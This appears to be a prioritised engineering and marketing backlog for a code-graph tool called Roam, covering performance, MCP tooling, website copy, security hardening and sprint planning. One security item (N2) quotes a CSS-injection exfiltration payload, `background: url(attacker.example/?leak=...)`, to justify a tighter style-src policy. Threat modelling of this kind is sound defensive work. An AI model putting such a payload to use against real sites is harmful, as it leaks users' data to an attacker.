- **Move:** Closest to canonical "what's in roam." Promote: source-of-truth
  README copy generated from it; MCP catalog agrees with it; landing page
  pulls from JSON dump.

### K. Performance tier-3

#### K1. Stable symbol IDs to survive incremental [08 A4]
- **Where:** `symbols.id` schema change
- **Effort:** 1 week, high regression risk
- **When:** v13.0 with clean schema break
- **Move:** Replace AUTOINCREMENT with `stable_id = hash(file_path +
  qualified_name + kind)` deterministic across runs. Lets graph_metrics,
  complexity, math_signals, clusters, annotations survive incremental.
  2-5x speedup on incremental.

#### K2. Memoize `_find_function_node` in `compute_and_store` [08 S4]
- **Where:** `complexity.py:1050` and 1111
- **Effort:** 15 min
- **Move:** 10-15% indexing speedup. Function called twice for same
  `(ls, le)` pair — stash and reuse.

#### K3. Bulk-fetch `_trace_io_via_edges` [08 S5]
- **Where:** `cmd_n1.py:449-478`
- **Effort:** 1 hour
- **Move:** 2-3x on edge-heavy projects. Pre-fetch all callees of every
  accessor in one query; pre-fetch all sub-callees of all callees in one
  query. Walk in Python.

#### K4. Index-bundle export/import surfaced [08 B1]
- **Where:** Already shipped (`cmd_index_bundle.py`); doc it
- **Effort:** 1 day
- **Move:** Update README + setup page: "If your CI already indexed, run
  `roam bundle pull` instead of `roam init`." 100x for repeat consumers.

#### K5. FTS5 trigram tokenizer [08 B2]
- **Where:** New `symbol_fts_tri` (SQLite ≥3.34)
- **Effort:** 2 hours
- **When:** When users complain about typeahead
- **Move:** Constant query time + better partial-word match.
  3-5x storage overhead — defer until users complain.

#### K6. Replace correlated subquery in `_relink_annotations` [08 B4]
- **Where:** `indexer.py:552-569`
- **Effort:** 30 min
- **Move:** Today: `UPDATE … SET symbol_id = (SELECT … FROM symbols
  WHERE qualified_name = annotations.qualified_name LIMIT 1)`. Per row.
  Replace with temp-table join. 100ms savings on big repos with annotations.

#### K7. Watcher: filter at `Observer.schedule` boundary [08 B5]
- **Where:** `watcher.py:296-297`
- **Effort:** 1 hour
- **Move:** `PatternMatchingEventHandler` with `ignore_patterns=
  ['*/node_modules/*', '*/.git/*', '*/.venv/*', '*/__pycache__/*',
  '*/dist/*', '*/build/*']`. Saves CPU on npm install storms.

#### K8. `cache_key` field in JSON envelope [08 B6]
- **Where:** `output/formatter.py:json_envelope`
- **Effort:** 30 min
- **Move:** `out["_meta"]["cache_key"] = f"{command}:{db_mtime_epoch}:
  {cwd_hash}"` for cacheable commands. Document in agent-contract.html.
  Real client caching becomes possible.

#### K9. Defer `_compute_cognitive_load` to background [08 B7]
- **Where:** Already runs after edges/clustering
- **Effort:** 2 hours
- **Move:** Move to separate `roam analyze cognitive-load` command;
  re-run lazily when `roam health` / `roam debt` called and metric
  stale. ~500ms/index savings on big repos. Behaviour change for users
  who expect `roam health` instant after `roam index`.

#### K10. EXPLAIN QUERY PLAN audit (`roam doctor --explain`) [08 B8]
- **Where:** New mode in `cmd_doctor.py`
- **Effort:** 1 day
- **Move:** Run every hot-path query against indexed DB; surface "SCAN
  TABLE …" entries that should be index-backed. Likely candidates:
  dead-export query, `_relink_annotations` correlated subquery,
  `compute_cochange` GROUP BY.

#### K11. SQLite version sanity check at index time [08 B9]
- **Where:** Index start
- **Effort:** 1 hour
- **Move:** Warn (don't fail) if `sqlite3.sqlite_version_info < (3, 42)`.
  Recommends Python 3.12 for trigram tokenizer + perf wins. Surface in
  `roam doctor`.

#### K12. SQL-only graph mode for huge repos [08 C1]
- **Where:** `roam_impact`, `roam_preflight`, `roam_coupling` get SQL
  variants
- **Effort:** 2 weeks, high regression risk
- **When:** When a 10M+ LOC user complains
- **Move:** Skip full NetworkX load for >100k symbols. Heavyweight
  commands (PageRank, Louvain, spectral) remain "small repo only" with
  clear error. Threshold via `ROAM_SQL_GRAPH_THRESHOLD=100000`.

#### K13. Streaming reference resolver [08 C2]
- **Where:** `indexer.py:_resolve_and_store_edges`
- **Effort:** 1 week
- **Move:** Today: holds `all_references` (10GB potential at 5M-LOC) in
  memory, resolves all in one pass. Replace with disk-backed iterator:
  write references to temp SQLite table during extract; resolve in
  batches. 5-10x peak RAM reduction.

#### K14. Tree-sitter incremental parsing [08 C3]
- **Where:** `parser.py:parse_file`
- **Effort:** 2 weeks, high
- **When:** After Tier S+A exhausted
- **Move:** Persist `Tree` objects between runs. Trees aren't picklable;
  serialize via `tree.print_dot_graph()` or `tree.copy()` API. 20-30%
  savings on second-or-later index, but bounded by share of "modified
  vs added/removed" — typically 80-90% are unchanged anyway.

#### K15. ONNX model warmup at server start [08 C4]
- **Where:** `search/onnx_embeddings.py`
- **Effort:** 30 min
- **Move:** Pre-load embedding model on MCP server boot (background
  thread). First request to `roam_retrieve` doesn't pay model-load tax.
  ~200MB idle memory increase.

#### K16. HTTP-mode 429 transport guard for MCP [08 C5]
- **Where:** Future hosted MCP transport wrapper
- **Effort:** 1 day
- **When:** Mandatory before Roam Cloud ships
- **Move:** Surface BUSY envelopes as proper HTTP 429 + Retry-After.
  Today's body-only signal is invisible to non-MCP-aware clients.

#### K17. Lazy-load tree-sitter grammars [08 C7]
- **Where:** `parser.py:13`
- **Effort:** 1 hour
- **Move:** `from tree_sitter_language_pack import get_parser` is at
  module top. Move into `parse_file` to defer until first use. ~100ms
  cold-start savings.

#### K18. `roam stats` self-benchmark command [08 C8]
- **Where:** New command
- **Effort:** 1 day
- **Move:** Surface deterministic "indexing took X seconds for Y kLOC"
  report after every `roam init`. Persist last 10 runs in
  `.roam/stats.json` so users (and Roam Cloud) see drift over time.
  Foundation for "your repo got 30% bigger this quarter; index time is
  up 80%".

### L. MCP / DX tier-3

#### L1. Compat profile coverage for Amp [04 R14]
- **Where:** `_CLIENT_COMPAT_PROFILES`
- **Effort:** 30 min
- **Move:** Currently no entry; all other clients have one. Add entry
  matching Amp's actual capabilities.

#### L2. Cursor-rule generator [04 R15]
- **Where:** `roam mcp-setup cursor`
- **Effort:** 1 day
- **Move:** Emit `.cursor/rules/roam.mdc` with contract-anchored rules.
  Equivalent of SKILL.md for Cursor.

#### L3. `roam_skill_generate` runtime skill emission [04 R16]
- **Where:** New
- **Effort:** 2 days
- **Move:** Pulls from `_TOOL_METADATA` + recipe registry; emits a small
  skill keyed on active preset. Avoids "SKILL.md says 211 commands but we
  now have 208" drift. Mentioned in agent-contract page as future capability.

#### L4. Recipe expansion: 24 → 35 [04 R17]
- **Where:** `src/roam/ask/recipes.py`
- **Effort:** 1-2 days
- **Move:** Missing recipes flagged in dogfood: `pre-rename`,
  `pre-deletion-cascade`, `migrate-tests`, `db-write-audit`,
  `bisect-regression`, `fleet-replan`, `production-incident`,
  `i18n-audit`, `licence-audit`, `ai-policy-evidence`,
  `re-index-after-pull`.

#### L5. Per-tool concurrency telemetry exposed via `roam_health` [04 R18]
- **Where:** `concurrency.metrics()` + `roam_health`
- **Effort:** Half day
- **Move:** Surface for agents to self-tune burst behaviour (back off if
  `busy_responses_total` rising).

#### L6. Streaming `roam_critique` [04 R19]
- **Where:** `cmd_critique.py` MCP wrapper
- **Effort:** 2 days
- **Move:** Stream findings as discovered (clones first, then impact,
  then layer violations). Agents on context-pressured clients can stop
  early on first BLOCK.

#### L7. `roam_explain_response` agent debugging tool [04 R20]
- **Where:** New
- **Effort:** 1 day
- **Move:** When agent doesn't understand a result, calling
  `roam_explain_response(envelope, question)` runs envelope through
  structured explanation. "Why is the verdict HIGH?" / "What does
  `tangle_ratio: 0.34` mean here?" Cheaper than sampling round-trip
  because explanation is deterministic from envelope structure.

#### L8. Drop the 5 native MCP prompts [04 R21]
- **Where:** `mcp_server.py:7245-7351`
- **Effort:** 30 min
- **Move:** 5 prompts (`roam-onboard`, etc.) are anti-pattern (tell agent
  to call a tool the user could call directly). Compound tools + skill
  cover same ground. Reduce three sources of truth (skill / contract /
  prompts) to two.

#### L9. Cargo-cult removal pass on long-tail tools [04 R23]
- **When:** After S20 (telemetry) is in place
- **Effort:** Ongoing
- **Move:** Drop tools called <0.1% over 30 days. Phase 3 candidates
  flagged: foxpro/sfxml/visualforce extractors as MCP tools (keep CLI),
  `roam_capsule_export` (keep CLI), spectral/Fiedler tools (keep CLI).

#### L10. Add Cursor and Amp to compat profile validation [04 R22]
- **Where:** `_CLIENT_COMPAT_PROFILES` test fixtures
- **Effort:** 1 day
- **Move:** Add MCP conformance test fixtures for Cursor 0.45+ and Amp.
  Currently `claude` and `codex` get the most testing.

### M. Site / brand tier-3

#### M1. Re-order: senses grid before algo wedge (or add bridge) [07 #7]
- **Where:** `index.html` section order
- **Effort:** S
- **Move:** Counter-arg: brief calls wedge "the differentiator" — risks
  burying. Compromise: keep wedge in position 2 + add bridge sentence in
  lede pointing forward to senses grid.

#### M2. Strengthen primary CTA verb on homepage [07 #12]
- **Where:** `.hero-ctas .btn-primary`
- **Effort:** XS
- **Move:** A/B candidate: *"Install in 30 seconds — free"* (specific +
  benefit-oriented). Lower-risk: *"Install Roam (it's free)"*. Test
  variants; otherwise pick low-risk.

#### M3. Pricing persona-band overlap with buying-path list [07 #13]
- **Where:** `pricing.html .persona-band`
- **Effort:** S
- **Move:** Repeats Free CLI / Review / Cloud / Self-Hosted ladder one
  screen below buying-path ordered list. Either fold into buying-path
  footer, OR delete persona-band entirely.

#### M4. Add citation or rephrase algo-wedge unsourced claim [07 #14]
- **Where:** `index.html .whats-in--dark .lede`
- **Effort:** XS
- **Move:** Either add `<span class="lede-source">` citation, OR rephrase
  to remove implicit appeal-to-data: *"These are the AI patterns Roam
  catches that linters and semantic reviewers miss: O(n²) loops, N+1
  queries, regex compiled inside loops, repeated JSON parsing, recursion
  without memoisation."*

#### M5. Audit-page primary CTAs reference action, not anchor [07 #15]
- **Where:** `audit.html .hero-ctas`
- **Effort:** S
- **Move:** *"Buy a Team Replay — $2,500"* (primary, mailto for now until
  S3) / *"See the sample"* (secondary). Current makes user move twice
  (anchor → tier pick → mailto); paid-funnel landing should commit
  faster.

#### M6. PR mockup polish — remove placeholder `tabindex="-1"` [07 #16]
- **Where:** `index.html .pr-find-loc a[tabindex="-1"]`
- **Effort:** XS
- **Move:** Replace decorative `<a tabindex="-1">` with `<span
  class="pr-link-mock">` to reduce semantic noise for screen readers.

#### M7. Standardise docs-page hero pattern [07 #17]
- **Where:** 8 docs pages
- **Effort:** S
- **Move:** docs/index + docs/how-roam-thinks use homepage hero pattern;
  docs/getting-started + docs/agent-contract use docs-page pattern.
  Three pages one rhythm, two pages another. Pick one — recommend
  docs-page pattern for all eight (lighter, more reading-room).

#### M8. Footer link reorder [07 #18]
- **Where:** All 24 pages footer
- **Effort:** XS
- **Move:** Split col 3 into "Product" (Setup / Changelog / Status) and
  "Company" (About / Press / Security / Accessibility). Reduces
  cognitive load on footer skim.

#### M9. Trust strip 5 → 4 cells [07 #19]
- **Where:** `index.html .trust-strip`
- **Effort:** XS
- **Move:** Industry pattern: Linear 4, Resend 3, Stripe Atlas 3.
  Merge "no telemetry" + "no training" into one cell: *"We never see
  your code or train on it. No telemetry from the CLI; no model training
  across any product."*

#### M10. Per-page OG titles on `og.png` reuse [07 #20]
- **Where:** All non-home pages
- **Effort:** Medium
- **Move:** Tools like Vercel OG / og-impact-generator can produce
  per-page OG variants on build. Audit page in particular — highest-
  revenue landing for paid traffic.

#### M11. About-page headline missing [07 #21]
- **Where:** `about.html`
- **Effort:** XS
- **Move:** Currently `<h1>About</h1>`. Could carry weight: *"About —
  built in Athens, Apache 2.0, customer-funded."* Same for press.html
  and security.html.

#### M12. Compare-page repeat of comparison table [07 #22]
- **Where:** `compare.html`
- **Effort:** S
- **Move:** Add "9 axes" version on compare.html that expands beyond
  homepage's 9 rows (15 rows covering CI integration, multi-repo, IDE,
  rule_count, etc.). Keep the duplication but soften with depth.

#### M13. Senses-aside italic block breaks rhythm [07 #23]
- **Where:** `.sense-cell--featured .sense-aside em`
- **Effort:** XS
- **Move:** Either give every sense cell an aside (not advised — adds
  noise) or remove the aside from algo and let `--featured` styling
  carry the weight.

#### M14. Hero trust-strip count number staleness [07 #24]
- **Where:** `index.html`, `docs/index.html`
- **Effort:** XS
- **Move:** Hero trust-strip says `7,731 PyPI installs/month`; press kit
  says `~7,700 / month and rising`. Pick a single source-of-truth from
  CI (`scripts/repo_hygiene.py`) or accept static drift as snapshot
  dated under numbers grid. Add snapshot date to trust-strip too.

#### M15. Mobile-only collapse senses grid to "1 featured + see all 9" [07]
- **Where:** Mobile CSS for senses grid
- **Effort:** S
- **Move:** Nine cells stack vertically on mobile = nine paragraphs of
  content before "How it works." Algo cell already `--featured`; on
  mobile show only featured + disclosure for the rest.

### N. Security / compliance tier-3

#### N1. Rate-limit MCP per session-id [05 R19]
- **Where:** `mcp_extras/concurrency.py`
- **Effort:** 1 day
- **When:** Hosted MCP readiness
- **Move:** Today's global semaphore should become global+per-session.
  FastMCP exposes session-id.

#### N2. Tighten `style-src` once user-content surface added [05 R20]
- **Where:** `_headers`
- **Effort:** Deferred
- **When:** When Roam Cloud dashboard ships
- **Move:** Plan for `style-src 'self' 'nonce-…'`. CSS injection via
  stored XSS becomes exfiltration vector via `background:
  url(attacker.example/?leak=...)`.

#### N3. CSP Report-Only header [05 R21]
- **Where:** `_headers`
- **Effort:** Half hour
- **Move:** Add `Content-Security-Policy-Report-Only` parallel for
  piloting tighter directives without breaking the live site.

#### N4. Explicit `frame-src` and `worker-src` [05 R22]
- **Where:** `_headers`
- **Effort:** 15 min
- **Move:** Currently inherited from `default-src 'self'`. Explicit is
  friendlier to header-scanners.

#### N5. Quarterly tabletop / threat-model review [05 R23]
- **Where:** New `SECURITY-PROCESS.md`
- **Effort:** 1 day
- **Move:** Procurement § 12 promises it for Business+. Process should
  exist before first paid customer asks.

#### N6. Soften `cga.py:34-38` "Reference impl candidate" comment [05 R24]
- **Where:** `cga.py:34-38`
- **Effort:** 15 min
- **Move:** Either submit to in-toto attestation registry or remove the
  claim. Quasi-overclaim in source comments.

#### N7. `Hiring:` and `CSAF:` in security.txt [05 R25]
- **When:** When you actually hire / publish CSAF
- **Effort:** Deferred
- **Move:** Until then no-op. Discoverability signal once active.

#### N8. Earlier private VDP-with-bounty [05 R26]
- **When:** Practitioner norm 25-50 customers
- **Effort:** Deferred
- **Move:** Today's "100 paid customers" trigger reviewed annually. 2026
  norm to start earlier.

#### N9. **AT REVIEW LAUNCH**: contractual GitHub App permission scope review [05 R27]
- **Effort:** 1 day, P0 at Review launch
- **Move:** With counsel. Specifically the `Pull requests: read & write`
  ask. CodeRabbit lesson: write-permission-on-PR is the blast-radius
  multiplier.

#### N10. **AT REVIEW LAUNCH**: hardware-isolated runner + token-broker [05 R28]
- **Effort:** 1 week, P0 at Review launch
- **Move:** GitHub App private key NOT env-var-injected. Honor packet § 2
  ("ephemeral sandbox, network-restricted, destroyed on shutdown")
  operationally. Don't allow plugin-style extension config files in
  customer repos to influence the runner.

#### N11. **AT CLOUD LAUNCH**: re-do the full security review [05 R29]
- **Effort:** This whole exercise repeated, P0 at Cloud launch
- **Move:** Today's review is 100% in-process / static-site. Hosted
  attack surface needs fresh review.

#### N12. Document taint-rule trust model [05 R18]
- **Where:** `/docs/site/`
- **Effort:** Half day
- **Move:** "Rules are author-trusted, name-shape match, BFS bounded at
  6 hops / 200-edge fan-out." Pre-empt the "we got pwned by a community
  rule" narrative.

---

## TIER ★★ — Lower-priority polish + future bets

### O. Polish / nice-to-have

#### O1. Compress trust strip to 3 load-bearing items [01 C2]
- Currently 5 → 3:
  1. **100% local + Apache 2.0** (combines two)
  2. **No telemetry, no training on your code, no API keys** (combines two)
  3. **28 languages, 6 cross-language bridges** (kept)
- Drop "Local audit trail" cell; move to /security.

#### O2. FAQ entry: "Why a local graph if I have Greptile/CodeRabbit?" [01 C3]
- **Move:** "Greptile and CodeRabbit build a graph in their cloud, on
  their schedule, with their privacy policy. Roam builds the graph on
  your laptop, on every commit, and your agent calls it directly via
  MCP. Different graph, different access pattern, different trust model.
  Most teams keep both."

#### O3. One more buzzword grep [01 C9]
- "leverage," "deliver," "powerful," "robust," "synergy," "delightful,"
  "supercharge," "transform." Replace each with a verb. Voice already
  strong; one more pass tightens it.

#### O4. `roam init --quick` profile [06 R23]
- For large monorepos that bog down on first init. Skips git_stats,
  reduces parser concurrency, defers PageRank. 5x faster init on huge
  repos.

#### O5. Editor-detection in MCP setup output [06 R24]
- `roam mcp-setup` (no args) → "Detected: Claude Code (CLAUDE.md found).
  Use `roam mcp-setup claude-code` or `roam mcp-setup --write
  claude-code`."

#### O6. MCP server name collision callout [06 R25]
- Doc the `roam:` prefix Claude Code applies on collision. Mention what
  other servers do when running roam alongside other graph servers
  (Serena, CKB).

#### O7. Inline first-class `tour` invitation on `roam init` [06 R27]
- Trivial copy edit. Tour invocation rate increases on day 1.

#### O8. "Common errors" section in setup.html [06 R28]
- 4-5 entries: PEP 668, PATH after `uv`, Windows shell quoting, Python
  version too old.

#### O9. Per-MCP-tool example in `roam mcp --list-tools` [06 R29]
- Each tool entry includes 1-line example invocation in addition to
  description. Faster agent learning.

#### O10. `roam ask --suggest <topic>` [06 R30]
- For users with vague intent. `roam ask --suggest performance` → list
  of 3 most relevant recipes (`find-bug`, `algo-audit`, `n1-audit`)
  without running them. Bridges "I don't know what to ask" gap.

#### O11. Replace dead `--yes` flag on `roam init` [06 R20]
- Either remove (current behavior is already non-interactive), or
  repurpose for new opt-in CI generation.

#### O12. Surface `roam doctor` in setup.html [06 R17]
- Add Step 1.5: "Verify install: `roam --check` (basic) or `roam doctor`
  (comprehensive)." Doctor invocation rate on day 1 > 50%.

#### O13. Promote `roam ask` in `--help` and getting-started [06 R8]
- In new short `--help` (S11), put `roam ask "<question>"` as 6th line
  of "Start here" with framing: "+ ask when you don't know which
  command".

#### O14. Fix `ensure_index()` mixed message [06 R6]
- Replace "Run `roam init`" + auto-index combo with single line:
  `Building first roam index — this is a one-time step (~10s for typical
  repos)…`

### P. Session-finding follow-ups [S, D]

#### P1. Update dogfood triage with false-positive findings
- **Where:** `dev/dogfood-triage-2026-05-10.md`
- **Effort:** XS
- **Move:** Document this session's detector-fix work — 4 of 5 originally-
  flagged math/algo findings cleared as false positives after detector
  fixes (complexity walker iterator-vs-body, list-prepend SQL `_`-LIKE
  escape, nested-lookup suppression list expansion, IO-wrapper
  cross-repo names).

#### P2. Fix the quadratic string concat in gitignore.py [D B]
- **Where:** `src/roam/index/gitignore.py:21` `_compile_pattern`
- **Effort:** 30 min
- **Status:** Fixed this session — `regex += "..."` → `parts: list[str]`
  + `"".join(parts)`. Both outer pattern compile + inner character-class
  loop. Document done.

#### P3. Split `_scan_buffer_for_diagnostics` complexity-178 [D C]
- **Where:** LSP scanner
- **Effort:** Focused session — 4-6 new helper functions
- **Why now:** Single highest-complexity function in the repo.

#### P4. 87 dead exports "safe to delete" — manual review [D D]
- **Where:** Run `roam dead --safe-only`
- **Effort:** Manual review of list
- **Why now:** Auto-deletion is risky for public-API breakage; some
  "dead" exports may be consumed by external agents via MCP without
  showing up in local call graph. Most likely safe.

#### P5. 116 clone clusters (76% avg similarity) [D E]
- **Where:** Group by file pair, collapse genuinely-redundant
- **Effort:** Focused cleanup pass
- **Why now:** Many will be intentional template patterns across command
  files (CLAUDE.md "Command template" guidance). Expect ~30-50 real
  consolidations after filtering templates.

#### P6. doc-staleness 484 docs >90 days behind code [D F]
- **Where:** Various docs
- **Effort:** Pick top-10 by traffic
- **Why now:** Many docs intentionally stable. Bulk action not warranted.

#### P7. fitness 1 rule 50 violations [D G]
- **Where:** `roam fitness --explain`
- **Effort:** Investigation
- **Why now:** May be real architecture-drift signal; needs investigation
  before fixing. Some violations may be deliberate exceptions.

#### P8. orphan-imports 167 across 706 files [D]
- **Where:** Various
- **Effort:** Audit
- **Why now:** Real cleanup signal but long-tail.

### Q. Exploratory / future bets (when capacity exists)

#### Q1. Compute-once reusable PageRank — already correct [08 C6]
- **Status:** False alarm. PageRank already persists to `graph_metrics`
  via builder. Subsequent commands read from table. Cache helps within-
  process compound commands. Net: nothing to do.

#### Q2. Migration cost on schema upgrades [08 3.13]
- 27 ALTER TABLE attempts on every connection open; ~50µs each = 1.4ms
  cold-connection tax. When column type changes are needed (e.g.
  widening `cognitive_complexity` REAL → JSON), SQLite requires CREATE
  NEW TABLE → INSERT FROM OLD → DROP OLD → RENAME. None scripted today.
  Covered by A2 (migration sequence numbers).

#### Q3. GenericExtractor inheritance supplement [08 polish]
- `indexer.py:664-675` builds a fresh `GenericExtractor(language=…)` per
  file. For 10k Python files = 10k `__init__` calls. Likely cacheable
  per-language. 30-min dive in follow-up to confirm impact.

#### Q4. SQLite version sanity [08 1.4]
- System sqlite shipped with Python 3.11.9 install is 3.39.4 (Sept
  2022). Newer wins: 3.42 trigram, 3.45 JSONB, 3.46 FTS5 tokenchars,
  3.49 FTS5 BM25 column-weight micro-opt. Users on Python 3.12+ get
  ≥3.45. Already at python_requires ≥3.10.

#### Q5. `parse_git_log` 5000-commit cap [08 3.11]
- Hidden truncation. 10-year-old repo with 50k commits silently loses
  long-tail co-change signal. Worth surfacing to user (`-n 5000` vs full).

#### Q6. The "100k-LOC indexes in seconds" claim has no defending test [08]
- Homepage `index.html:898` extrapolates from 200-file fixture. Would
  not catch a 10x regression. Two numbers conflict: `0.6s/kLOC`
  (mcp-server-card.json) × 100kLOC = 60s vs `20-40s` (homepage). Pick
  one number, defend with real test. Customers comparing the two will
  lose trust.

#### Q7. Bench fixture for 100k-LOC and 10k-commit [08 3.1]
- No perf test for "1M-LOC monorepo" or "10k-commit repo." Eval harness
  in `eval/harness.py` is for retrieve quality, not indexing speed.

---

## Cross-cutting themes (where multiple agents independently flagged the same gap)

### Theme α: Capability Registry incomplete + split-brain registries
- Surfaces in: 03 R1 (architecture), 04 R6 (preset count drift), 06 G3
  (alias help confusion), session work (test_surface_consistency.py
  proposal), dogfood triage (intent --undocumented bug)
- Single-most-load-bearing piece of debt. Substrate exists; adoption
  stopped at 5/211. Split-brain dicts: `_COMMANDS`, `_CATEGORIES`,
  `_MATURITY`, `_STALE_SENSITIVE`, `_CORE_TOOLS`, `_NON_READ_ONLY_TOOLS`,
  `_DESTRUCTIVE_TOOLS`, `_TASK_REQUIRED_TOOLS`, `_TASK_OPTIONAL_TOOLS`.
- Capture: S18 (test) → A1 (full migration) → J13 (explain-command
  rebase) → J14 (surface-counts as spine).

### Theme β: Three-way drift between code, server instructions, and memory
- 04 Phase 1: code says 39 core, instructions string says 16, MEMORY
  says 33. Agents reading description undercount.
- 05 § 1.6 + procurement § 6.1 vs DPA: marketing makes promise; binding
  document doesn't carry it.
- 07: press kit colour palette `#fdfdfd` vs site `#fafaf6`.
- Capture: S20 (telemetry) + L9 (cargo-cult removal) + S6 (DPA rewrite)
  + D7 (press kit fix).

### Theme γ: Documentation that exists but isn't consumed
- 03 R7: `roam doctor` doesn't read `index_manifest`.
- 04: 24 `roam ask` recipes CLI-only, never reach MCP.
- 04: 5 native MCP prompts duplicate compound tools — three sources of
  truth.
- 06: `roam doctor` 17-check is excellent; nobody finds it.
- 06: `troubleshooting.html` is good; CLI errors don't link to it.
- 07: 4 docs pages have no subnav.
- Capture: S9 + S17 + S19 + L8 + D3 + G5.

### Theme δ: Load-bearing claims that are regression-blind
- 05 R4: cosign skipped silently → "verified" verdict.
- 05 R1+R2: `git_dirty_hash` recorded but never bound into predicate.
- 08 S1: rename loses cross-file edges silently.
- 08 Q6: 100k-LOC perf claim has no test.
- Capture: S2 + S4 + S5 + Q7.

### Theme ε: Trust strip / hero / CTAs all under-amplifying the strongest unhedged claims
- 01 A3 + 07: "100% local" sits below the fold; the strongest claim is
  whispered.
- 01 B6: "200+ commands" sounds like feature creep; "5 verbs" is buyable.
- 01 A4 + 02: PR Replay free DIY is the highest-converting on-ramp
  Roam has and it sits below the FAQ.
- 02 A1: mailto-as-buy-button on $2,500 ticket = malpractice.
- Capture: S3 + S8 + S10 + H2 + H8.

### Theme ζ: First-run experience leaks at every step
- 06 R1: unsolicited CI workflow file.
- 06 R2: PEP 668 PEP 668 PEP 668.
- 06 R3: 154-line `--help` wall.
- 06 R4: doctor never surfaces.
- 06 R7: OneDrive bombs silently.
- 06 R5: no "your first 10 minutes."
- Capture: S1 + S11 + S12 + S13 + S19 + G1.

---

## Sequencing recommendation

A pragmatic order, given the brief is "everything that adds value despite
complexity," but the user is the one who decides what to actually pick up.
Treat this as *one sensible read*, not the locked plan.

### Sprint 1 — load-bearing 1-day fixes (do most of these together)
S1, S2, S4, S5, S16, S17, S18, S19, B5, K2, F5, F6 — all small, high-leverage,
no design loop.

### Sprint 2 — site/copy/CTA pass (no engineering)
S7, S8, S10, D1, D2, D3, D4, D5, D6, D7, D8, D9, H8, H10, H13, F3.

### Sprint 3 — agent/MCP DX
S9, S14, S15, S20, E1, E2, E5, E6, E7.

### Sprint 4 — DX onboarding
S11, S12, S13, G1, G2, G7, G9, G10, G14.

### Sprint 5 — perf heavy hitters
B1, B2, B3, B4, B6, B7, B8.

### Sprint 6 — architecture substrate (the big rocks)
A1 (Capability Registry), A2 (migrations), A3 (detector registry),
A4 (finding registry), A5 (split health()), A6 (version stamps),
A7 (MCP versioning), A8 (step-completion manifest).

### Sprint 7 — GTM revenue-blocking
S3 (Stripe live), C1 (GitHub Marketplace), C2 (tighten Starter),
C3 (Founding Customer lock), C4 (Self-Hosted off public 4-card),
C5 (annual toggle).

### Tier-3 backlog (ongoing)
H1 (50-PR benchmark — multi-week), H4–H20 (positioning + brand),
I1–I13 (build priorities customer-pulled), J1–J14 (architecture
tier-3), K1–K18 (perf tier-3), L1–L10 (MCP tier-3), M1–M15 (site
polish), N1–N12 (security tier-3), O1–O14 (polish), P1–P8 (session
follow-ups), Q1–Q7 (exploratory).

---

## Reading notes

- **Not a release-scope plan.** Picking what goes into v13.0 / v13.1 / etc
  is a separate decision that combines this file with customer signal and
  capacity.
- **Conflicts exist.** Some items disagree (e.g. H3 "drop senses from H1s"
  vs M1 "re-order senses grid before algo wedge"). Both are defensible;
  only one survives any single rewrite. Pick when scheduling, not here.
- **Revenue numbers in the GTM tier are ranges.** The 02 GTM audit gives
  projections; treat as ballparks, not commitments.

---

## Sources

External research that informed the recommendations above. Item tags
(`[01]`–`[08]`) match the audit-angle tags throughout this file —
read these when you need a citation, not the *what to do*.

### [01] Positioning + market research
- [Anthropic 2026 Agentic Coding Trends Report](https://resources.anthropic.com/hubfs/2026%20Agentic%20Coding%20Trends%20Report.pdf) (PDF)
- [Atlan — Why AI Agents Need an Enterprise Context Layer](https://atlan.com/know/why-ai-agents-need-an-enterprise-context-layer/)
- [Atlan — Context Engineering Framework for Enterprise AI 2026](https://atlan.com/know/context-engineering-framework/)
- [Augment Code — AI Code Review Tools for Large Codebases](https://www.augmentcode.com/guides/ai-code-review-tools-for-large-codebases-enterprise-guide)
- [BuildMVPFast — Best developer tools 2026](https://www.buildmvpfast.com/blog/best-developer-tools-2026-tech-stack)
- [Faros AI — Best AI Coding Agents 2026](https://www.faros.ai/blog/best-ai-coding-agents-2026)
- [Greptile — Graph-Based Codebase Context](https://www.greptile.com/docs/how-greptile-works/graph-based-codebase-context)
- [Martin Fowler — Harness engineering for coding agent users](https://martinfowler.com/articles/harness-engineering.html)
- [Packmind — Best context engineering tools 2026](https://packmind.com/context-engineering-ai-coding/best-context-engineering-tools/)
- [Qodo — 8 Best AI Code Review Tools 2026](https://www.qodo.ai/blog/best-ai-code-review-tools-2026/)
- [Techsy — AI code review tools accuracy ranking](https://techsy.io/blog/best-ai-code-review-tools)
- [YipitData — Greptile vs CodeRabbit market](https://www.yipitdata.com/resources/blog/greptile-vs-coderabbit-ai-code-review-market)
- [Mean.ceo — Emerging startup trends May 2026](https://blog.mean.ceo/emerging-startup-trends-may-2026/)

### [02] GTM + monetization
- [Sacra — CodeRabbit revenue, valuation & funding](https://sacra.com/c/coderabbit/)
- [CheckThat.ai — CodeRabbit Pricing 2026](https://checkthat.ai/brands/coderabbit/pricing)
- [NxCode — AI Coding Tools Pricing Comparison 2026](https://www.nxcode.io/resources/news/ai-coding-tools-pricing-comparison-2026)
- [dev.to / Korix — AI Pricing Models 2026](https://dev.to/korix/ai-pricing-models-per-seat-vs-per-use-vs-outcome-2026-32ep)
- [Howdygo — PLG software for conversion + activation 2026](https://www.howdygo.com/blog/plg-software-and-tools-for-improving-conversion-and-activation)
- [daydream — Freemium Conversion Rate Benchmarks](https://www.withdaydream.com/library/insights/freemium-conversion-rate)
- [Userpilot — Product-Led vs Sales-Led Growth 2026](https://userpilot.com/blog/product-led-vs-sales-led/)
- [Pixelswithin — B2B SaaS Conversion Benchmarks 2026](https://pixelswithin.com/b2b-saas-conversion-benchmarks-2026/)
- [SaaS Hero — 2026 B2B SaaS Conversion Benchmarks](https://www.saashero.net/content/2026-b2b-saas-conversion-benchmarks/)
- [Inflection — SaaS Onboarding Audit](https://www.inflection.io/post/all-you-need-to-know-about-saas-onboarding-audit-in-2023)

### [03] Architecture + indexer engineering
- [Codebase-Memory paper (arXiv 2603.27277)](https://arxiv.org/html/2603.27277v1)
- [DeusData/codebase-memory-mcp](https://github.com/DeusData/codebase-memory-mcp)
- [Continue dev codebase indexing (DeepWiki)](https://deepwiki.com/continuedev/continue/3.4-codebase-indexing)
- [FastMCP 3.0 release notes — jlowin](https://jlowin.dev/blog/fastmcp-3-whats-new)
- [Click — Complex CLI guide](https://click.palletsprojects.com/en/stable/complex/)
- [Alembic — Batch operations for SQLite](https://alembic.sqlalchemy.org/en/latest/batch.html)
- [yoyo-migrations](https://ollycope.com/software/yoyo/latest/)
- [phiresky — SQLite WAL deep-dive](https://phiresky.github.io/blog/2020/sqlite-performance-tuning/)
- [SkyPilot — SQLite concurrency pattern](https://blog.skypilot.co/abusing-sqlite-to-handle-concurrency/)
